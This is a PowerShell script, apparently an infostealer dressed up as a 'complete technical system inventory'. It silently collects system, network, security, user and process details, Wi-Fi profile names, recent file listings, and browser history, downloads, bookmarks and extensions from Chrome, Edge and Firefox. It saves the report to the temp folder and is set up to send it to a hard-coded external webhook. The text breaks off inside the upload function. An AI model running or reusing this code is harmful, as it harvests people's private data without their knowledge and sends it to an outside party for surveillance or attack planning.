#requires -Version 5.1


# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://n8n.caju.dpdns.org/webhook/bot'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)

$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'

function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [string]$OutputFile = $OutputFileDefault,
        [string]$ExportDir = $ExportDirDefault,
        [int]$RecentFiles = 100
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $sb = [Text.StringBuilder]::new()
    $sep = '=' * 78
    $add = { param($x) [void]$sb.AppendLine([string]$x) }
    $sec = { param($x) & $add ''; & $add $x; & $add ('-' * 78) }
    $try = { param([scriptblock]$b) try { & $b } catch { $null } }
    $fmt = { param($n,$v) & $add ('{0,-21}: {1}' -f $n,$v) }

    & $add $sep
    & $add 'INVENTÁRIO TÉCNICO COMPLETO DO SISTEMA'
    & $add "Coletado em: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    & $add $sep

    & $sec '## 01. IDENTIFICAÇÃO'
    @(
        "Usuário              : $env:USERNAME"
        "Domínio              : $env:USERDOMAIN"
        "Domínio DNS          : $env:USERDNSDOMAIN"
        "Perfil               : $env:USERPROFILE"
        "Computador           : $env:COMPUTERNAME"
        "Processador PS       : $env:PROCESSOR_IDENTIFIER"
        "Arquitetura PS       : $env:PROCESSOR_ARCHITECTURE"
    ) | % { & $add $_ }

    $cs = & $try { Get-CimInstance Win32_ComputerSystem }
    $os = & $try { Get-CimInstance Win32_OperatingSystem }
    $reg = & $try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' }

    if($cs){
        & $fmt 'Fabricante' $cs.Manufacturer
        & $fmt 'Modelo' $cs.Model
        $cp = & $try { Get-CimInstance Win32_ComputerSystemProduct }
        if($cp){ & $fmt 'UUID' $cp.UUID }
        & $fmt 'Domínio/Workgroup' $(if($cs.PartOfDomain){"Domínio: $($cs.Domain)"}else{"Workgroup: $($cs.Workgroup)"})
    }

    & $sec '## 02. SISTEMA OPERACIONAL / WINDOWS'
    if($os){
        $build = if($reg.CurrentBuild){ "$($reg.CurrentBuild).$($reg.UBR)" }else{$os.BuildNumber}
        @(
            "Produto              : $($reg.ProductName)"
            "Display Version       : $($reg.DisplayVersion)"
            "Release ID            : $($reg.ReleaseId)"
            "Build                 : $build"
            "Versão WMI            : $($os.Version)"
            "Arquitetura           : $($os.OSArchitecture)"
            "Idioma                : $($os.MUILanguages -join ', ')"
            "Instalação            : $($os.InstallDate)"
            "Último Boot           : $($os.LastBootUpTime)"
            "Uptime (dias)         : $([math]::Round(((Get-Date)-$os.LastBootUpTime).TotalDays,1))"
            "Windows Directory     : $($os.WindowsDirectory)"
            "System Directory      : $($os.SystemDirectory)"
            "Product Type          : $($os.ProductType)"
            "Usuário registrado    : $($os.RegisteredUser)"
        ) | % { & $add $_ }
    }

    $lic = & $try { Get-CimInstance SoftwareLicensingProduct | ? { $_.PartialProductKey -and $_.LicenseStatus -eq 1 } | select -First 1 }
    if($lic){ & $fmt 'Ativação Windows' 'Licenciado/Ativado' }

    & $sec '## 03. HARDWARE'
    $bios = & $try { Get-CimInstance Win32_BIOS }
    if($bios){
        @(
            "BIOS                 : $($bios.Name)"
            "BIOS Fabricante       : $($bios.Manufacturer)"
            "BIOS Versão           : $($bios.SMBIOSBIOSVersion)"
            "BIOS Data             : $($bios.ReleaseDate)"
            "Serial                : $($bios.SerialNumber)"
        ) | % { & $add $_ }
    }

    $cpu = & $try { Get-CimInstance Win32_Processor | select -First 1 }
    if($cpu){
        @(
            "CPU                  : $($cpu.Name)"
            "Cores                : $($cpu.NumberOfCores)"
            "Threads              : $($cpu.NumberOfLogicalProcessors)"
            "Clock Máx.           : $($cpu.MaxClockSpeed) MHz"
            "Clock Atual          : $($cpu.CurrentClockSpeed) MHz"
            "Cache L2             : $([math]::Round($cpu.L2CacheSize/1KB,0)) KB"
            "Cache L3             : $([math]::Round($cpu.L3CacheSize/1KB,0)) KB"
        ) | % { & $add $_ }
    }

    $ram = & $try { Get-CimInstance Win32_PhysicalMemory }
    if($ram){
        & $add ''; & $add 'MEMÓRIA RAM:'
        $ram | % { & $add "  - $([math]::Round($_.Capacity/1GB,1)) GB | $($_.Speed) MHz | $($_.Manufacturer) | $($_.PartNumber) | Slot: $($_.DeviceLocator)" }
    }

    $disks = & $try { Get-CimInstance Win32_DiskDrive }
    if($disks){
        & $add ''; & $add 'DISCOS FÍSICOS:'
        $disks | % { & $add "  - $($_.Model) | $([math]::Round($_.Size/1GB,0)) GB | Interface: $($_.InterfaceType) | Serial: $($_.SerialNumber) | Firmware: $($_.FirmwareRevision)" }
    }

    $parts = & $try { Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' }
    if($parts){
        & $add ''; & $add 'VOLUMES:'
        $parts | % {
            $used=$_.Size-$_.FreeSpace
            & $add "  - $($_.DeviceID) | FS: $($_.FileSystem) | Total: $([math]::Round($_.Size/1GB,2)) GB | Usado: $([math]::Round($used/1GB,2)) GB | Livre: $([math]::Round($_.FreeSpace/$_.Size*100,1))%"
        }
    }

    $smart = & $try { Get-PhysicalDisk }
    if($smart){
        & $add ''; & $add 'SAÚDE DOS DISCOS:'
        $smart | % { & $add "  - $($_.FriendlyName) | Tipo: $($_.MediaType) | Health: $($_.HealthStatus) | Operacional: $($_.OperationalStatus) | Tamanho: $([math]::Round($_.Size/1GB,0)) GB" }
    }

    $gpus = & $try { Get-CimInstance Win32_VideoController }
    if($gpus){
        & $add ''; & $add 'GPU / VÍDEO:'
        $gpus | % { & $add "  - $($_.Name) | Driver: $($_.DriverVersion) | Data: $($_.DriverDate) | VRAM: $([math]::Round($_.AdapterRAM/1GB,1)) GB | Res: $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)" }
    }

    $mon = & $try { Get-CimInstance Win32_DesktopMonitor }
    if($mon){
        & $add ''; & $add 'MONITORES:'
        $mon | % { & $add "  - $($_.Name) | PNP: $($_.PNPDeviceID)" }
    }

    $devBad = & $try { Get-CimInstance Win32_PnPEntity | ? ConfigManagerErrorCode -and ConfigManagerErrorCode -ne 0 }
    if($devBad){
        & $add ''; & $add 'DISPOSITIVOS COM ERRO:'
        $devBad | % { & $add "  - $($_.Name) | Código: $($_.ConfigManagerErrorCode) | PNP: $($_.PNPDeviceID)" }
    }

    $bat = & $try { Get-CimInstance Win32_Battery }
    if($bat){
        & $add ''; & $add 'BATERIA:'
        $bat | % { & $add "  - $($_.Name) | Status: $($_.BatteryStatus) | Design: $([math]::Round($_.DesignCapacity/1000,0)) mWh | Atual: $([math]::Round($_.CurrentCapacity/1000,0)) mWh" }
    }

    & $sec '## 04. REDE'
    $adapters = & $try { Get-NetAdapter }
    if($adapters){
        & $add 'ADAPTADORES:'
        $adapters | % { & $add "  - $($_.Name) | $($_.InterfaceDescription) | Status: $($_.Status) | MAC: $($_.MacAddress) | Link: $($_.LinkSpeed)" }
    }

    $globalIp='[não disponível]'
    foreach($u in 'https://api.ipify.org','https://ifconfig.me','https://icanhazip.com'){
        if($globalIp -eq '[não disponível]'){
            $v=&$try{(Invoke-WebRequest $u -UseBasicParsing -TimeoutSec 5).Content.Trim()}
            if($v){$globalIp=$v}
        }
    }
    & $fmt 'IP Público' $globalIp

    $cfgs = & $try { Get-NetIPConfiguration }
    if($cfgs){
        & $add ''; & $add 'CONFIGURAÇÕES IP:'
        $cfgs | % {
            $ip=if($_.IPv4Address){$_.IPv4Address.IPAddress -join ', '}else{'-'}
            $gw=if($_.IPv4DefaultGateway){$_.IPv4DefaultGateway.NextHop -join ', '}else{'-'}
            $dns=if($_.DnsServer){$_.DnsServer.ServerAddresses -join ', '}else{'-'}
            & $add "  - $($_.InterfaceAlias) | IPv4: $ip | GW: $gw | DNS: $dns | DHCP: $($_.IPv4DHCPEnabled)"
        }
    }

    $prof = & $try { Get-NetConnectionProfile }
    if($prof){
        & $add ''; & $add 'PERFIL DE REDE:'
        $prof | % { & $add "  - $($_.InterfaceAlias) | Rede: $($_.Name) | Categoria: $($_.NetworkCategory) | IPv4: $($_.IPv4Connectivity) | IPv6: $($_.IPv6Connectivity)" }
    }

    $proxy = & $try { Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' }
    if($proxy){ & $fmt 'Proxy' $(if($proxy.ProxyEnable){"Ativo - $($proxy.ProxyServer)"}else{'Desativado'}) }

    $route = & $try { Get-NetRoute -AddressFamily IPv4 | ? { $_.NextHop -notin '0.0.0.0','255.255.255.255' } | select -First 30 }
    if($route){
        & $add ''; & $add 'ROTAS:'
        $route | % { & $add "  - $($_.DestinationPrefix) | Gateway: $($_.NextHop) | Métrica: $($_.RouteMetric) | Interface: $($_.InterfaceAlias)" }
    }

    $arp=&$try{Get-NetNeighbor|? State -ne Unreachable|select -First 50}
    if($arp){
        & $add ''; & $add 'ARP:'
        $arp|%{&$add "  - $($_.IPAddress) | $($_.MacAddress) | $($_.State) | $($_.InterfaceAlias)"}
    }

    $wifi = & $try { netsh wlan show interfaces 2>$null }
    if($wifi){
        & $add ''; & $add 'WI-FI ATUAL:'
        $wifi | sls '^\s*(SSID|BSSID|Radio type|Channel|Receive rate|Transmit rate|Signal|State)\s*:' | % { & $add "  - $($_.Line.Trim())" }
    }

    $profiles=&$try{netsh wlan show profiles 2>$null|sls '^\s*All User Profile\s*:\s*(.+)'|%{$_.Matches[0].Groups[1].Value.Trim()}}
    if($profiles){
        & $add ''; & $add 'PERFIS WI-FI SALVOS (somente SSID):'
        $profiles|%{&$add "  - $_"}
    }

    & $sec '## 05. SEGURANÇA'
    $fw=&$try{Get-NetFirewallProfile}
    if($fw){&$add "Firewall             : $(($fw|%{"$($_.Name): $(if($_.Enabled){'ON'}else{'OFF'})"}) -join ', ')"}

    $tpm=&$try{Get-Tpm}
    if($tpm){@("TPM presente         : $($tpm.TpmPresent)","TPM pronto            : $($tpm.TpmReady)","TPM versão            : $($tpm.ManufacturerVersion)")|%{&$add $_}}

    $sbv=&$try{Confirm-SecureBootUEFI}
    if($sbv -ne $null){&$fmt 'Secure Boot' $(if($sbv){'Ativado'}else{'Desativado'})}

    $bit=&$try{Get-BitLockerVolume}
    if($bit){&$add 'BITLOCKER:';$bit|%{&$add "  - $($_.MountPoint) | Status: $($_.VolumeStatus) | Proteção: $($_.ProtectionStatus) | Método: $($_.EncryptionMethod)"}}

    $av=&$try{Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct}
    if($av){&$add ''; & $add 'ANTIVÍRUS:';$av|%{&$add "  - $($_.DisplayName) | Status: $($_.productState)"}}

    $def=&$try{Get-MpComputerStatus}
    if($def){@("Defender             : Ativo=$($def.AntivirusEnabled) | RT=$($def.RealTimeProtectionEnabled)","Assinatura Defender   : $($def.AntivirusSignatureLastUpdated)")|%{&$add $_}}

    $uac=&$try{Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'}
    if($uac){&$fmt 'UAC' $(if($uac.EnableLUA){'Ativado'}else{'Desativado'})}

    & $sec '## 06. WINDOWS UPDATE / PATCHES'
    $hot=&$try{Get-HotFix|sort InstalledOn -Desc}
    if($hot){$hot|select -First 20|%{&$add "  - $($_.HotFixID) | $($_.InstalledOn) | $($_.Description)"}}

    $wu=&$try{
        $s=New-Object -ComObject Microsoft.Update.Session
        $q=$s.CreateUpdateSearcher()
        [pscustomobject]@{Last=$q.LastSearchSuccessDate;Pending=$q.Search('IsInstalled=0').Updates}
    }
    if($wu){@("Última busca         : $($wu.Last)","Pendentes             : $($wu.Pending.Count)")|%{&$add $_};$wu.Pending|select -First 10|%{&$add "  - $($_.Title)"}}

    & $sec '## 07. SOFTWARE / DRIVERS'
    $apps=&$try{Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'|? DisplayName|select DisplayName,DisplayVersion,Publisher,InstallDate|sort DisplayName}
    if($apps){$apps|select -First 100|%{&$add "  - $($_.DisplayName) v$($_.DisplayVersion) | $($_.Publisher) | $($_.InstallDate)"}}

    $drivers=&$try{Get-CimInstance Win32_PnPSignedDriver|? DeviceName|select DeviceName,DriverVersion,DriverDate,Manufacturer|sort DeviceName}
    if($drivers){&$add ''; & $add 'DRIVERS:';$drivers|select -First 100|%{&$add "  - $($_.DeviceName) | $($_.DriverVersion) | $($_.DriverDate) | $($_.Manufacturer)"}}

    & $sec '## 08. SERVIÇOS / INICIALIZAÇÃO'
    $svc=&$try{Get-Service|? Status -eq Running}
    if($svc){$svc|sort Name|select -First 100|%{&$add "  - $($_.Name) | $($_.DisplayName) | $($_.StartType)"}}

    $run=@(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    )
    & $add 'INICIALIZAÇÃO (Run):'
    foreach($p in $run){
        $x=&$try{Get-ItemProperty $p}
        if($x){$x.PSObject.Properties|? Name -notmatch '^PS'|%{&$add "  - $($_.Name): $($_.Value)"}}
    }

    $startup=@("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
    & $add 'PASTAS STARTUP:'
    foreach($p in $startup){&$try{Get-ChildItem $p -File|%{&$add "  - $($_.FullName)"}}}

    $tasks=&$try{Get-ScheduledTask|? {$_.State -ne 'Disabled' -and $_.TaskPath -notlike '\Microsoft\*'}|select TaskName,TaskPath,State}
    if($tasks){&$add ''; & $add 'TAREFAS AGENDADAS (TERCEIROS):';$tasks|select -First 100|%{&$add "  - $($_.TaskPath)$($_.TaskName) | $($_.State)"}}

    & $sec '## 09. USUÁRIOS / COMPARTILHAMENTOS'
    $users=&$try{Get-LocalUser}
    if($users){$users|%{&$add "  - $($_.Name) | Ativo: $($_.Enabled) | Último Login: $($_.LastLogon) | Senha: $($_.PasswordLastSet)"}}

    $admins=&$try{Get-LocalGroupMember Administrators}
    if($admins){&$add ''; & $add 'ADMINISTRADORES:';$admins|%{&$add "  - $($_.Name) | $($_.ObjectType)"}}

    $shares=&$try{Get-SmbShare}
    if($shares){&$add ''; & $add 'COMPARTILHAMENTOS SMB:';$shares|%{&$add "  - $($_.Name) | $($_.Path) | $($_.ShareType)"}}

    $mapped=&$try{Get-PSDrive -PSProvider FileSystem|? DisplayRoot}
    if($mapped){&$add ''; & $add 'DRIVES MAPEADOS:';$mapped|%{&$add "  - $($_.Name): -> $($_.DisplayRoot)"}}

    & $sec '## 10. PROCESSOS / DIAGNÓSTICO'
    $proc=&$try{Get-Process|sort WorkingSet64 -Desc|select -First 30}
    if($proc){$proc|%{&$add "  - $($_.ProcessName) | PID: $($_.Id) | Mem: $([math]::Round($_.WorkingSet64/1MB,1)) MB | CPU: $([math]::Round($_.CPU,1))s"}}

    $listen=&$try{netstat -ano 2>$null|sls LISTENING|select -First 50}
    if($listen){&$add ''; & $add 'PORTAS EM ESCUTA:';$listen|%{&$add "  - $($_.Line.Trim())"}}

    $est=&$try{netstat -ano 2>$null|sls ESTABLISHED|select -First 50}
    if($est){&$add ''; & $add 'CONEXÕES ESTABELECIDAS:';$est|%{&$add "  - $($_.Line.Trim())"}}

    $events=&$try{Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50}
    if($events){
        & $add ''; & $add 'ERROS/CRÍTICOS DO SYSTEM (7 DIAS):'
        $events|%{
            & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"
        }
    }

    $appEvents=&$try{Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50}
    if($appEvents){
        & $add ''; & $add 'ERROS/CRÍTICOS DE APLICATIVOS (7 DIAS):'
        $appEvents|%{
            & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"
        }
    }

    $dumps=&$try{Get-ChildItem "$env:SystemRoot\Minidump\*.dmp" -File}
    if($dumps){
        & $add ''; & $add 'MINIDUMPS:'
        $dumps|sort LastWriteTime -Desc|select -First 20|%{
            &$add "  - $($_.FullName) | $($_.LastWriteTime) | $([math]::Round($_.Length/1MB,1)) MB"
        }
    }

    & $sec '## 11. ARQUIVOS RECENTES'
    & $add "Limite: $RecentFiles por categoria"

    # ------------------------------------------------------------
    # ARQUIVOS RECENTES DO WINDOWS
    # ------------------------------------------------------------
    $recentRoot=Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    $recent=&$try{
        Get-ChildItem $recentRoot -File |
        sort LastWriteTime -Desc |
        select -First $RecentFiles
    }

    if($recent){
        & $add 'ITENS DA PASTA RECENTES DO WINDOWS:'
        $recent|%{
            &$add "  - $($_.LastWriteTime) | $($_.Name) | $($_.FullName)"
        }
    }

    # ------------------------------------------------------------
    # DOWNLOADS
    # ------------------------------------------------------------
    $downloadsRoot=Join-Path $env:USERPROFILE 'Downloads'
    $downloads=&$try{
        Get-ChildItem $downloadsRoot -File -Force -ErrorAction SilentlyContinue |
        sort LastWriteTime -Desc |
        select -First $RecentFiles
    }

    & $add ''
    & $add 'ARQUIVOS PRESENTES EM DOWNLOADS:'

    if($downloads){
        $downloads|%{
            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.Name) | $($_.FullName)"
        }
    }else{
        &$add '  [nenhum arquivo encontrado ou pasta indisponível]'
    }

    # ------------------------------------------------------------
    # DESKTOP
    # ------------------------------------------------------------
    $desktopRoot=[Environment]::GetFolderPath('Desktop')
    $desktop=&$try{
        Get-ChildItem $desktopRoot -File -Force -ErrorAction SilentlyContinue |
        sort LastWriteTime -Desc
    }

    & $add ''
    & $add 'ARQUIVOS PRESENTES NO DESKTOP:'

    if($desktop){
        $desktop|%{
            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.Name) | $($_.FullName)"
        }
    }else{
        &$add '  [nenhum arquivo encontrado ou Desktop indisponível]'
    }

    # ------------------------------------------------------------
    # ARQUIVOS RECENTEMENTE MODIFICADOS
    # ------------------------------------------------------------
    $scan=@(
        "$env:USERPROFILE\Desktop"
        "$env:USERPROFILE\Documents"
        "$env:USERPROFILE\Downloads"
    )

    $files=&$try{
        Get-ChildItem $scan -File -Force -ErrorAction SilentlyContinue |
        ? FullName -notmatch '\\AppData\\' |
        sort LastWriteTime -Desc |
        select -First $RecentFiles
    }

    if($files){
        & $add ''
        & $add 'ARQUIVOS RECENTEMENTE MODIFICADOS:'

        $files|%{
            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.FullName)"
        }
    }

    # ============================================================
    # 12. NAVEGADORES
    # ============================================================

    & $sec '## 12. NAVEGADORES / HISTÓRICO / DOWNLOADS / FAVORITOS / EXTENSÕES'

    # ------------------------------------------------------------
    # Localiza executáveis dos navegadores
    # ------------------------------------------------------------
    $browserRoots=@(
        [pscustomobject]@{
            Name='Google Chrome'
            UserRoot="$env:LOCALAPPDATA\Google\Chrome\User Data"
        }
        [pscustomobject]@{
            Name='Microsoft Edge'
            UserRoot="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        }
        [pscustomobject]@{
            Name='Mozilla Firefox'
            UserRoot="$env:APPDATA\Mozilla\Firefox\Profiles"
        }
    )

    # ------------------------------------------------------------
    # Helper SQLite
    #
    # Não altera a interface da função. Apenas tenta utilizar um
    # provider SQLite já existente no computador.
    # ------------------------------------------------------------
    $sqliteProvider=$null
    $sqliteType=$null

    try{
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
        $sqliteType=[System.Data.SQLite.SQLiteConnection]
        $sqliteProvider='System.Data.SQLite'
    }catch{}

    if(!$sqliteType){
        try{
            Add-Type -AssemblyName Microsoft.Data.Sqlite -ErrorAction Stop
            $sqliteType=[Microsoft.Data.Sqlite.SqliteConnection]
            $sqliteProvider='Microsoft.Data.Sqlite'
        }catch{}
    }

    function Invoke-BrowserSQLite {
        param(
            [string]$Database,
            [string]$Query
        )

        if(!$sqliteType){return $null}
        if(!(Test-Path $Database)){return $null}

        $tmp=Join-Path $env:TEMP ("sysinfo_sqlite_{0}.db" -f ([guid]::NewGuid().ToString('N')))

        try{
            Copy-Item $Database $tmp -Force -ErrorAction Stop

            if($sqliteProvider -eq 'System.Data.SQLite'){
                $cn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Read Only=True;")
            }else{
                $cn=New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmp;Mode=ReadOnly")
            }

            $cn.Open()
            $cmd=$cn.CreateCommand()
            $cmd.CommandText=$Query
            $rd=$cmd.ExecuteReader()

            $table=New-Object System.Data.DataTable
            $table.Load($rd)

            $rd.Dispose()
            $cmd.Dispose()
            $cn.Close()
            $cn.Dispose()

            return $table
        }catch{
            return $null
        }finally{
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }

    foreach($browser in $browserRoots){

        if(!(Test-Path $browser.UserRoot)){
            continue
        }

        & $add ''
        & $add $browser.Name.ToUpper()
        & $add ('-' * 78)

        # ========================================================
        # CHROME / EDGE
        # ========================================================
        if($browser.Name -ne 'Mozilla Firefox'){

            $profiles=&$try{
                Get-ChildItem $browser.UserRoot -Directory |
                ? {
                    $_.Name -eq 'Default' -or
                    $_.Name -like 'Profile *'
                }
            }

            foreach($profile in $profiles){

                $pn=$profile.Name
                & $add ''
                & $add "PERFIL: $pn"

                # ------------------------------------------------
                # Histórico
                # ------------------------------------------------
                $historyDb=Join-Path $profile.FullName 'History'

                if(Test-Path $historyDb){

                    $q=@'
SELECT
    urls.url AS URL,
    urls.title AS Titulo,
    datetime((visits.visit_time/1000000)-11644473600,'unixepoch','localtime') AS Data
FROM visits
JOIN urls ON visits.url=urls.id
ORDER BY visits.visit_time DESC
LIMIT 100
'@

                    $hist=&$try{Invoke-BrowserSQLite $historyDb $q}

                    & $add 'HISTÓRICO DE NAVEGAÇÃO:'

                    if($hist){
                        $hist|%{
                            &$add "  - $($_.Data) | $($_.Titulo) | $($_.URL)"
                        }
                    }elseif($sqliteType){
                        &$add '  [histórico localizado, mas não foi possível consultar o banco]'
                    }else{
                        &$add '  [SQLite não disponível para consulta deste banco]'
                    }

                    # ------------------------------------------------
                    # Downloads do navegador
                    # ------------------------------------------------
                    $q=@'
SELECT
    target_path AS Arquivo,
    tab_url AS URL,
    datetime((start_time/1000000)-11644473600,'unixepoch','localtime') AS Data
FROM downloads
ORDER BY start_time DESC
LIMIT 100
'@

                    $dl=&$try{Invoke-BrowserSQLite $historyDb $q}

                    & $add ''
                    & $add 'DOWNLOADS DO NAVEGADOR:'

                    if($dl){
                        $dl|%{
                            &$add "  - $($_.Data) | $($_.Arquivo) | Origem: $($_.URL)"
                        }
                    }elseif($sqliteType){
                        &$add '  [banco localizado, mas consulta indisponível]'
                    }else{
                        &$add '  [SQLite não disponível]'
                    }
                }

                # ------------------------------------------------
                # Favoritos
                # ------------------------------------------------
                $bookmark=Join-Path $profile.FullName 'Bookmarks'

                if(Test-Path $bookmark){

                    & $add ''
                    & $add 'FAVORITOS:'

                    try{
                        $json=Get-Content $bookmark -Raw -Encoding UTF8 |
                            ConvertFrom-Json

                        $walkBookmark={
                            param($node)

                            if($node.children){
                                foreach($child in $node.children){
                                    if($child.type -eq 'url'){
                                        &$add "  - $($child.name) | $($child.url)"
                                    }

                                    if($child.children){
                                        &$walkBookmark $child
                                    }
                                }
                            }
                        }

                        if($json.roots){
                            foreach($root in $json.roots.PSObject.Properties){
                                if($root.Value){
                                    &$walkBookmark $root.Value
                                }
                            }
                        }
                    }catch{
                        &$add '  [não foi possível interpretar o arquivo de favoritos]'
                    }
                }

                # ------------------------------------------------
                # Extensões / Plugins
                # ------------------------------------------------
                $extRoot=Join-Path $profile.FullName 'Extensions'

                if(Test-Path $extRoot){

                    & $add ''
                    & $add 'EXTENSÕES / PLUGINS:'

                    $extensions=&$try{
                        Get-ChildItem $extRoot -Directory
                    }

                    foreach($ext in $extensions){

                        $manifest=&$try{
                            Get-ChildItem $ext.FullName -Filter manifest.json -Recurse -File |
                            select -First 1
                        }

                        if($manifest){

                            try{
                                $m=Get-Content $manifest.FullName -Raw -Encoding UTF8 |
                                    ConvertFrom-Json

                                $name=$m.name
                                $version=$m.version

                                if($name -and $name -match '^__MSG_'){
                                    $name=$ext.Name
                                }

                                &$add "  - $name | Versão: $version | ID: $($ext.Name)"
                            }catch{
                                &$add "  - ID: $($ext.Name)"
                            }
                        }else{
                            &$add "  - ID: $($ext.Name)"
                        }
                    }
                }
            }
        }

        # ========================================================
        # FIREFOX
        # ========================================================
        else{

            $profiles=&$try{
                Get-ChildItem $browser.UserRoot -Directory
            }

            foreach($profile in $profiles){

                & $add ''
                & $add "PERFIL: $($profile.Name)"

                $places=Join-Path $profile.FullName 'places.sqlite'

                if(Test-Path $places){

                    # ------------------------------------------------
                    # Histórico Firefox
                    # ------------------------------------------------
                    $q=@'
SELECT
    moz_places.url AS URL,
    moz_places.title AS Titulo,
    datetime(moz_historyvisits.visit_date/1000000,'unixepoch','localtime') AS Data
FROM moz_historyvisits
JOIN moz_places ON moz_historyvisits.place_id=moz_places.id
ORDER BY moz_historyvisits.visit_date DESC
LIMIT 100
'@

                    $hist=&$try{Invoke-BrowserSQLite $places $q}

                    & $add 'HISTÓRICO DE NAVEGAÇÃO:'

                    if($hist){
                        $hist|%{
                            &$add "  - $($_.Data) | $($_.Titulo) | $($_.URL)"
                        }
                    }elseif($sqliteType){
                        &$add '  [histórico localizado, mas não foi possível consultar o banco]'
                    }else{
                        &$add '  [SQLite não disponível]'
                    }

                    # ------------------------------------------------
                    # Downloads Firefox
                    #
                    # Dependendo da versão do Firefox, informações
                    # de downloads podem estar em moz_annos.
                    # ------------------------------------------------
                    $q=@'
SELECT
    p.url AS URL,
    p.title AS Titulo,
    a.content AS Informacao
FROM moz_annos a
JOIN moz_places p ON a.place_id=p.id
WHERE a.content LIKE '%download%'
ORDER BY a.id DESC
LIMIT 100
'@

                    $dl=&$try{Invoke-BrowserSQLite $places $q}

                    & $add ''
                    & $add 'DOWNLOADS DO NAVEGADOR:'

                    if($dl){
                        $dl|%{
                            &$add "  - $($_.URL) | $($_.Titulo) | $($_.Informacao)"
                        }
                    }else{
                        &$add '  [nenhum registro de download disponível no banco]'
                    }

                    # ------------------------------------------------
                    # Favoritos Firefox
                    # ------------------------------------------------
                    $q=@'
SELECT
    b.title AS Titulo,
    p.url AS URL
FROM moz_bookmarks b
JOIN moz_places p ON b.fk=p.id
WHERE b.type=1
ORDER BY b.dateAdded DESC
LIMIT 500
'@

                    $fav=&$try{Invoke-BrowserSQLite $places $q}

                    & $add ''
                    & $add 'FAVORITOS:'

                    if($fav){
                        $fav|%{
                            &$add "  - $($_.Titulo) | $($_.URL)"
                        }
                    }else{
                        &$add '  [nenhum favorito localizado]'
                    }
                }

                # ------------------------------------------------
                # Extensões Firefox
                # ------------------------------------------------
                $addons=Join-Path $profile.FullName 'extensions.json'

                if(Test-Path $addons){

                    & $add ''
                    & $add 'EXTENSÕES / PLUGINS:'

                    try{
                        $j=Get-Content $addons -Raw -Encoding UTF8 |
                            ConvertFrom-Json

                        if($j.addons){
                            $j.addons|%{
                                if($_.active -or $_.userDisabled -eq $false){
                                    &$add "  - $($_.defaultLocale.name) | Versão: $($_.version) | ID: $($_.id)"
                                }
                            }
                        }
                    }catch{
                        &$add '  [não foi possível interpretar extensions.json]'
                    }
                }
            }
        }
    }

    # ============================================================
    # 13. AMBIENTE
    # ============================================================

    & $sec '## 13. AMBIENTE'

    foreach($n in 'PATH','APPDATA','PROGRAMDATA','SYSTEMDRIVE','SYSTEMROOT','TEMP','TMP','USERNAME','COMPUTERNAME'){
        $v=[Environment]::GetEnvironmentVariable($n)

        if($v){
            $v=if($v.Length -gt 80){
                $v.Substring(0,40)+'...'+$v.Substring($v.Length-30)
            }else{
                $v
            }

            &$add "  $n = $v"
        }
    }

    & $add ''
    & $add $sep
    & $add 'FIM DO RELATÓRIO'
    & $add $sep

    try{
        if(!(Test-Path $ExportDir -PathType Container)){
            New-Item $ExportDir -ItemType Directory -Force|Out-Null
        }

        $sb.ToString()|Out-File $OutputFile -Encoding UTF8 -Force

        Write-Host "Relatório salvo em: $OutputFile"

        return $OutputFile
    }
    catch{
        Write-Error "Falha ao salvar relatório em $OutputFile`: $_"
    }
}


##############################################################################

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
